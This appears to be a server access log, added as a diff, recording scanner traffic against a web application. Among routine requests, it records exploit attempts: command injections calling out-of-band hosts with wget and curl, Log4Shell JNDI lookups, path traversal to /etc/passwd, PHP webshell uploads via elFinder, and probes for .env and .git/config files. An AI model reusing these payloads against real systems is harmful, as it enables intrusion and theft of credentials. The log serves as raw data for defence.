+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     20.64.106.117:43200 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     185.93.89.97:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     185.93.89.97:0 - "GET /api/config/tsconfig.json HTTP/1.0" 404 Not Found
+INFO:     3.132.23.201:35576 - "GET / HTTP/1.1" 200 OK
+INFO:     3.132.23.201:32962 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     45.82.78.103:47486 - "GET / HTTP/1.1" 200 OK
+INFO:     45.82.78.114:43400 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     57.141.0.20:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     57.141.0.27:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     206.189.2.13:0 - "POST /api/graphql HTTP/1.0" 404 Not Found
+INFO:     206.189.2.13:0 - "POST /api/gql HTTP/1.0" 404 Not Found
+INFO:     206.189.2.13:0 - "GET /api/swagger.json HTTP/1.0" 404 Not Found
+INFO:     167.94.146.55:52220 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.55:45690 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.55:44364 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.55:44384 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.55:47024 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.55:59852 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     167.94.146.55:59868 - "GET /login HTTP/1.1" 200 OK
+INFO:     89.208.97.133:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     57.141.0.47:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     205.210.31.72:58976 - "GET / HTTP/1.1" 200 OK
+INFO:     57.141.0.64:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     138.68.153.47:59832 - "GET /aaa9 HTTP/1.1" 200 OK
+INFO:     138.68.153.47:59842 - "GET /aab8 HTTP/1.1" 200 OK
+INFO:     138.68.153.47:59852 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     178.62.21.89:35618 - "GET / HTTP/1.1" 200 OK
+INFO:     178.62.21.89:35626 - "GET /login HTTP/1.1" 200 OK
+INFO:     194.165.16.11:54226 - "POST /webtools/control/SOAPService HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54228 - "POST /goform/setmac HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54236 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54240 - "POST /webtools/control/SOAPService HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54246 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:54260 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:54258 - "GET /owa/auth/x.js HTTP/1.1" 200 OK
+INFO:     194.165.16.11:54254 - "POST /index.php HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:50806 - "GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name=34HnpOGeWqy0TCj7wb8NnR8xLLB.php&target=l1_Lw HTTP/1.1" 302 Found
+INFO:     147.229.220.220:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     194.165.16.11:51758 - "GET /search.php?search=%22;wget+http%3A%2F%2Fd3qe7gf49vd8v4f7qkogkro95nwy646mw.oast.site%27;%22 HTTP/1.1" 200 OK
+INFO:     147.185.132.219:62748 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.123:52928 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.123:47156 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.123:47176 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.123:47192 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.123:36684 - "GET /security.txt HTTP/1.1" 200 OK
+INFO:     206.168.34.123:36686 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.123:52702 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     139.59.100.1:36622 - "GET /.env HTTP/1.1" 200 OK
+INFO:     139.59.100.1:36632 - "GET /.git/config HTTP/1.1" 200 OK
+INFO:     198.235.24.220:62890 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.156:56019 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.237:56073 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:37966 - "GET //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d3qe7gf49vd8v4f7qkogqo9wdr5x4kk7y.oast.site)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything HTTP/1.1" 200 OK
+INFO:     194.165.16.11:37978 - "GET /?action=command&command=set_city_timezone&value=$(wget%20http://d3qe7gf49vd8v4f7qkogf87gc8nu4b75b.oast.site)) HTTP/1.1" 200 OK
+INFO:     194.165.16.11:37986 - "POST /goform/formWsc HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:58076 - "POST /tools.cgi HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:58078 - "POST /tools.cgi HTTP/1.1" 403 Forbidden
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     159.65.99.140:36064 - "GET / HTTP/1.1" 200 OK
+INFO:     159.65.99.140:36076 - "GET /login HTTP/1.1" 200 OK
+INFO:     141.134.3.1:54701 - "GET / HTTP/1.0" 200 OK
+INFO:     65.49.20.67:45452 - "GET / HTTP/1.1" 200 OK
+INFO:     65.49.20.99:34177 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     65.49.20.95:6323 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     3.137.73.221:55860 - "GET / HTTP/1.1" 200 OK
+INFO:     3.137.73.221:60520 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     195.178.110.108:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.108:0 - "GET /api/shared/config/config.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.108:0 - "GET /api/shared/config.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.108:0 - "GET /api/shared/config/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.108:0 - "GET /api/shared/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.108:0 - "GET /api/config.env HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     134.209.224.6:57218 - "GET / HTTP/1.1" 200 OK
+INFO:     134.209.224.6:57228 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.216:62682 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:36776 - "POST /wp-admin/admin-ajax.php HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:36786 - "GET /wp-content/uploads/pp-files/kdyca.php HTTP/1.1" 200 OK
+INFO:     138.197.141.90:44486 - "GET / HTTP/1.1" 200 OK
+INFO:     138.197.141.90:44498 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     138.197.154.111:32928 - "GET /.env HTTP/1.1" 200 OK
+INFO:     138.197.154.111:32930 - "GET /.git/config HTTP/1.1" 200 OK
+INFO:     66.240.219.146:53884 - "GET / HTTP/1.1" 200 OK
+INFO:     66.240.219.146:54580 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     194.165.16.11:40552 - "POST /cgi/networkDiag.cgi HTTP/1.1" 403 Forbidden
+INFO:     205.210.31.107:57848 - "GET / HTTP/1.1" 200 OK
+INFO:     78.153.140.203:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     205.210.31.200:59522 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:33354 - "GET /login/ HTTP/1.1" 200 OK
+INFO:     47.74.55.112:59334 - "GET / HTTP/1.1" 200 OK
+INFO:     123.160.223.73:59345 - "GET / HTTP/1.1" 200 OK
+INFO:     123.160.223.75:41645 - "GET / HTTP/1.1" 200 OK
+INFO:     123.160.223.75:41689 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     123.160.223.72:12883 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     78.153.140.123:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     194.165.16.11:34810 - "POST /wsman HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:42000 - "PUT /SDK/webLanguage HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:42004 - "GET /x HTTP/1.1" 200 OK
+INFO:     194.165.16.11:47990 - "POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:48002 - "GET /34HnpOoit43bYGfy3nTVYD20xqQ.php?cmd=sudo+rpm+--eval+'%25{lua%3aos.execute("curl+http%3a//d3qe7gf49vd8v4f7qkoggqnhp1zgfxrxh.oast.site+-H+'User-Agent%3a+f3q1ly'")}' HTTP/1.1" 200 OK
+INFO:     198.235.24.91:63498 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.110.28:31552 - "GET /api/v2/heartbeat HTTP/1.1" 404 Not Found
+INFO:     165.154.110.28:31922 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.110.28:32142 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.110.28:32274 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     165.154.110.28:32758 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     165.154.110.28:32864 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     205.210.31.89:60450 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.94:36316 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.95:62161 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.156.105:7497 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     3.130.96.91:49678 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.117:52480 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.117:52486 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.117:52496 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.117:34340 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     66.132.153.117:53024 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.117:53038 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.115:44588 - "GET /security.txt HTTP/1.1" 200 OK
+INFO:     206.168.34.115:43150 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     206.168.34.115:43202 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     78.153.140.176:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     78.153.140.176:0 - "GET /api/v2/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.233:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.233:0 - "GET /api/user HTTP/1.0" 404 Not Found
+INFO:     195.178.110.233:0 - "GET /api/login HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     205.210.31.197:60670 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     165.232.68.138:37106 - "GET / HTTP/1.1" 200 OK
+INFO:     165.232.68.138:37114 - "GET /login HTTP/1.1" 200 OK
+INFO:     194.165.16.11:39070 - "POST /_ignition/execute-solution HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:39086 - "POST /_ignition/execute-solution HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:39100 - "POST /_ignition/execute-solution HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:39102 - "POST /_ignition/execute-solution HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:39114 - "POST /_ignition/execute-solution HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:39130 - "POST /_ignition/execute-solution HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:47268 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     119.73.159.34:48255 - "GET / HTTP/1.0" 200 OK
+INFO:     104.199.26.108:34112 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.40.244:46216 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     118.193.43.158:60326 - "GET / HTTP/1.1" 200 OK
+INFO:     118.193.43.158:60402 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     118.193.43.158:60644 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     118.193.43.158:60900 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     118.193.43.158:60902 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     194.165.16.11:34996 - "POST /cobbler_api HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:53562 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     195.178.110.109:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/shared/config/config.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/shared/config.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/shared/config/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/shared/.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/config.env HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/config.js HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/objects/codes.php.save HTTP/1.0" 404 Not Found
+INFO:     195.178.110.109:0 - "GET /api/config/config.yml HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     46.34.225.177:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     46.34.225.177:0 - "GET /api/skill/91/ HTTP/1.0" 200 OK
+With count None
+Skill ids [91, 55, 55]
+INFO:     46.34.225.177:0 - "GET /api/skills/91/tree/related HTTP/1.0" 200 OK
+INFO:     46.34.225.177:0 - "GET /api/examples/?topics=%5B91%5D HTTP/1.0" 200 OK
+INFO:     46.34.225.177:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     46.34.225.177:0 - "GET /api/examples/?topics=%5B91%5D HTTP/1.0" 200 OK
+INFO:     46.34.225.177:0 - "POST /api/create-record/ HTTP/1.0" 201 Created
+INFO:     194.165.16.11:37214 - "GET /index.php HTTP/1.1" 200 OK
+INFO:     194.165.16.11:34132 - "POST / HTTP/1.1" 403 Forbidden
+INFO:     5.187.35.54:54328 - "GET /../../../../../../proc/self/environ HTTP/1.1" 200 OK
+INFO:     147.185.132.40:60168 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.60:61720 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:40496 - "GET /cgi-bin/slogin/login.py HTTP/1.1" 200 OK
+INFO:     194.165.16.11:34674 - "GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=34HnpMvVEwuaTMcSfwEa8Kq3ZRF.php:aaa HTTP/1.1" 200 OK
+INFO:     194.165.16.11:34688 - "POST /sitecore/shell/ClientBin/Reporting/Report.ashx HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:34694 - "GET /STATE_ID/123/agentLogUploader HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:43370 - "POST /cgi?2 HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:43376 - "POST /cgi?7 HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:38188 - "POST /v1/backend1 HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:38190 - "GET /v1/34HnpMXsDw36cKbZ9thCxB9Dv1D.php HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.156.80:27740 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.82:16523 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.156.81:2607 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     176.74.157.8:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     194.165.16.11:60850 - "GET /?x=${jndi:ldap://127.0.0.1 HTTP/1.1" 200 OK
+INFO:     194.165.16.11:47970 - "POST /ddns_check.ccp HTTP/1.1" 403 Forbidden
+INFO:     78.153.140.203:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     3.143.33.63:57266 - "GET / HTTP/1.1" 200 OK
+INFO:     3.143.33.63:44850 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.129.77:53144 - "GET /api/v2/heartbeat HTTP/1.1" 404 Not Found
+INFO:     152.32.129.77:53622 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.129.77:54116 - "GET / HTTP/1.1" 200 OK
+INFO:     152.32.129.77:54482 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     152.32.129.77:54868 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     152.32.129.77:56152 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     3.130.96.91:52602 - "GET / HTTP/1.1" 200 OK
+INFO:     3.130.96.91:52612 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:47754 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 200 OK
+INFO:     194.165.16.11:47760 - "GET /icons/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     57.141.0.15:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     40.77.177.13:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     89.35.130.101:41864 - "GET / HTTP/1.1" 200 OK
+INFO:     89.35.130.101:41878 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     89.35.130.101:41888 - "GET /image/lgbg.jpg HTTP/1.1" 200 OK
+INFO:     89.35.130.101:41898 - "GET /nobody/favicon.ico HTTP/1.1" 200 OK
+INFO:     89.35.130.101:41904 - "GET /login.rsp HTTP/1.1" 200 OK
+INFO:     89.35.130.101:41908 - "GET /skin/default_1/images/logo.png HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     147.182.176.61:37320 - "GET / HTTP/1.1" 200 OK
+INFO:     147.182.176.61:37330 - "GET /login HTTP/1.1" 200 OK
+INFO:     78.153.140.179:0 - "GET /api/.env.1 HTTP/1.0" 404 Not Found
+INFO:     78.153.140.179:0 - "GET /api/.env.2 HTTP/1.0" 404 Not Found
+INFO:     195.178.110.199:44276 - "GET /.git/config HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     195.178.110.199:45360 - "GET / HTTP/1.1" 200 OK
+INFO:     130.131.162.132:57440 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:53670 - "GET /icons/../../../../../../etc/passwd HTTP/1.1" 200 OK
+INFO:     194.165.16.11:53680 - "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 200 OK
+INFO:     194.165.16.11:53682 - "POST /cgi-bin/../../../../../../bin/sh HTTP/1.1" 403 Forbidden
+WARNING:  Invalid HTTP request received.
+INFO:     71.6.134.231:36818 - "GET / HTTP/1.1" 200 OK
+INFO:     71.6.134.231:47482 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     78.153.140.151:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     78.153.140.151:0 - "GET /api/phpinfo.php HTTP/1.0" 404 Not Found
+INFO:     93.44.194.24:65029 - "GET / HTTP/1.0" 200 OK
+INFO:     162.142.125.207:57134 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.207:40832 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.207:40842 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.207:47980 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.207:48110 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.207:48734 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     162.142.125.207:48752 - "GET /robots.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     18.118.85.158:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     57.141.0.49:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+INFO:     194.165.16.11:46002 - "GET /?x=${jndi:ldap://${:-391}${:-917}.${hostName}.uri.d3qe7gf49vd8v4f7qkogmpcosm5bws4am.oast.site/a} HTTP/1.1" 200 OK
+INFO:     194.165.16.11:46004 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     162.142.125.198:34416 - "GET /security.txt HTTP/1.1" 200 OK
+INFO:     66.132.153.132:53766 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.132:53792 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.132:53800 - "GET /favicon.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.132:53884 - "GET /./app.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.132:42542 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     66.132.153.132:42650 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     206.168.34.212:41458 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     204.76.203.30:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     165.22.158.82:54974 - "GET /.env HTTP/1.1" 200 OK
+INFO:     165.22.158.82:54984 - "GET /.git/config HTTP/1.1" 200 OK
+INFO:     34.228.71.193:0 - "GET /api/landing-page-skills/ HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.235.24.12:58422 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.223:62156 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     165.227.104.170:54406 - "GET / HTTP/1.1" 200 OK
+INFO:     165.227.104.170:54416 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     134.122.30.157:44516 - "GET /aaa9 HTTP/1.1" 200 OK
+INFO:     134.122.30.157:44530 - "GET /aab8 HTTP/1.1" 200 OK
+INFO:     134.122.30.157:44546 - "GET / HTTP/1.1" 200 OK
+INFO:     194.165.16.11:34040 - "POST /./RestAPI/LogonCustomization HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:34052 - "POST /./RestAPI/LogonCustomization HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:34066 - "POST /./RestAPI/Connection HTTP/1.1" 403 Forbidden
+INFO:     194.165.16.11:34074 - "GET /help/admin-guide/test.jsp HTTP/1.1" 200 OK
+INFO:     205.210.31.215:60806 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     185.247.137.91:34319 - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.175:44545 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49158 - "GET / HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49160 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49166 - "GET /robots.txt HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49174 - "GET /sitemap.xml HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49186 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49202 - "GET /config.json HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49210 - "GET /sse HTTP/1.1" 200 OK
+INFO:     150.107.38.5:49222 - "GET /mcp HTTP/1.1" 200 OK
+INFO:     150.107.38.5:47552 - "GET /mcp-sse HTTP/1.1" 200 OK
+INFO:     205.210.31.217:58440 - "GET /.well-known/security.txt HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.156.24:43732 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.24:30269 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     64.62.156.26:7187 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:53062 - "GET /user/login HTTP/1.1" 200 OK
+INFO:     45.151.139.185:57554 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     170.64.170.49:58058 - "GET / HTTP/1.1" 200 OK
+INFO:     170.64.170.49:58060 - "GET /login HTTP/1.1" 200 OK
+INFO:     3.131.215.38:33342 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:55778 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     194.165.16.11:49060 - "POST /wp-admin/admin-ajax.php HTTP/1.1" 403 Forbidden
+INFO:     165.154.125.125:47256 - "GET /api/v2/heartbeat HTTP/1.1" 404 Not Found
+INFO:     165.154.125.125:47542 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.125.125:48414 - "GET / HTTP/1.1" 200 OK
+INFO:     165.154.125.125:48548 - "GET /app.ico HTTP/1.1" 200 OK
+INFO:     165.154.125.125:48892 - "GET /favicon.ico HTTP/1.1" 200 OK
+INFO:     165.154.125.125:48974 - "GET /assets/index-AtzM99DZ.js HTTP/1.1" 200 OK
+INFO:     78.153.140.178:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     2.57.122.234:55502 - "GET /https%3A//%27%2Blocation.hostname%2B%27%3A HTTP/1.1" 200 OK
+INFO:     176.65.149.253:0 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     45.151.139.185:51936 - "GET / HTTP/1.1" 200 OK
+INFO:     193.32.162.203:53010 - "GET / HTTP/1.1" 200 OK
+INFO:     193.32.162.203:53010 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     91.196.152.13:46429 - "GET / HTTP/1.1" 200 OK
+INFO:     91.196.152.104:58499 - "GET /app.ico HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     45.151.139.185:51740 - "GET /servlet?/servlet?m=mod_listener&p=login&q=loginForm&jumpto=status HTTP/1.1" 200 OK
+INFO:     45.151.139.185:52244 - "GET /servlet?/servlet?m=mod_listener&p=login&q=loginForm&jumpto=status HTTP/1.1" 200 OK
+INFO:     194.165.16.11:40714 - "POST /wp-json/am-member/license HTTP/1.1" 403 Forbidden
+INFO:     138.197.144.104:55860 - "GET /.env HTTP/1.1" 200 OK
+INFO:     138.197.144.104:55866 - "GET /.git/config HTTP/1.1" 200 OK
+INFO:     45.151.139.185:61286 - "GET /servlet?p=login&q=loginForm&jumpto=status HTTP/1.1" 200 OK
+INFO:     45.151.139.185:62905 - "GET /servlet?p=login&q=loginForm&jumpto=status HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.146.59:44472 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.59:56994 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.146.59:57006 - "GET /./app.ico HTTP/1.1" 200 OK
